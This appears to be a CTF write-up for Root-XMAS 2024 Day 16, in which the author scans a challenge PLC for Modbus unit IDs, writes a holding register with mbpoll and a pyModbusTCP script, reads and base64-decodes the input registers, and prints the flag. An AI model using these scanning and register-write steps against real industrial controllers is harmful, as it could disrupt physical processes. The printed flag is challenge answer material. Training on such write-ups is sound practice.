---
title: Root-XMAS 2024 Day 16 - Coil under the tree
feed: hide
permalink: /RootXMAS_2024_16
date: 16-12-2024
summary: Please put me in PLC
---

### summary

Industrial PLC id bruteforcing and communication. Not hard if you know about the domain! (I did not)
### recon

A challenge on a PLC!  (Programmable Logic Controller)! 
I followed the [LeHack 2024 conference on Industrial hacking by biero](https://www.youtube.com/watch?v=2d_Snz2lOO4&list=PLzGIjwtabBqh3sF_8xIrvRqdGnzBgXD-h&index=10) and his workshop, but I didn't remembered anything about it... And it didn't matter, as it was focused on Siemens devices, when this chall wasn't! Still, I wanted to give a shoutout to this nice talk!

Still, it's a subject I don't know at all, so sorry if I am approximative in my write-up.
### solution

The challenge gives us pretty precise instruction, we simply need to put them in action.
It tells us : "Scan and find a valid slave ID". When we don't know what to do, let's check what tools we have at disposition.

```bash
pacman -Ss plc
	...
	blackarch/plcscan 0.1-4
    This is a tool written in Python that will scan for 
    PLC devices over s7comm or modbus protocols.
```

Looks good enough for me. Let's launch it.

```bash
plcscan 163.172.68.42 --ports=10016 --brute-uid
	Scan start...                          
	163.172.68.42:10016 Modbus/TCP
	...
	Unit ID: 104
	    Device info error: GATEWAY TARGET DEVICE FAILED TO RESPOND
	  Unit ID: 105
	    Device: Root-Me Corp. PLC-RM001 1.0.0
	...

```

We have the slave ID, it's 105! Now what do?
It's easy to miss, the scanner tells us at the beginning that the device communicates with [Modbus](https://fr.wikipedia.org/wiki/Modbus) 

We only need to write one byte at a specific *holding* register, then read the *input* registers.
Searching online, we have multiple ways to send and receive data with modbus.

- The [mbpoll](https://manpages.ubuntu.com/manpages/lunar/man1/mbpoll.1.html) command line tool 

```bash
mbpoll 163.172.68.42 0xff -p 10016 -a 105 -r 0x10 && \
mbpoll 163.172.68.42 -p 10016 -a 105 -r 1 -c 125 -1 -t 3:string

	-- Polling slave 105...
	[1]: 	Q
	[2]: 	2
	...
	[106]: 	Q
	[107]: 	=
	[108]: 	=
```

We get an intersting base64 output! but the tool does not provide a more standard output format, so we will have to clean it ourself... nah, let's just switch to a python library!

- the [pyModbusTCP](https://pypi.org/project/pyModbusTCP/) python library

The library is pretty simple and well documented, 

```python
from pyModbusTCP.client import ModbusClient
from time import sleep
from base64 import b64decode

c = ModbusClient(host="163.172.68.42", port=10016, unit_id=105, auto_open=True)
c.write_single_register(0x10, 0xff)

res_list = c.read_input_registers(0, 125)
res_str = "".join([chr(x) for x in res_list])
res_dec = b64decode(res_str).decode(errors='ignore')

print(res_list, res_str, res_dec, sep="\n")
```

```bash
[81, 50, 57, ..., 81, 61, 61, 0, 0 ...]
Q29u...ViNjJ9XG4nXQ==
Congratulations, you can validate this challenge with:
['RM{13ad1bc2e25b62}\n']
```


> [!error] warning!
> You have to read at the input register at index *0* , other indexes also contain base64 strings, but with random data. if you chose index *1* you would get lost in a false lead!

| Previous day | [[Day 15 - New new .. always new]] |
| ------------ | ---------------------------------- |
| Next day     | [[Day 17 - Ghost in the shell]]    |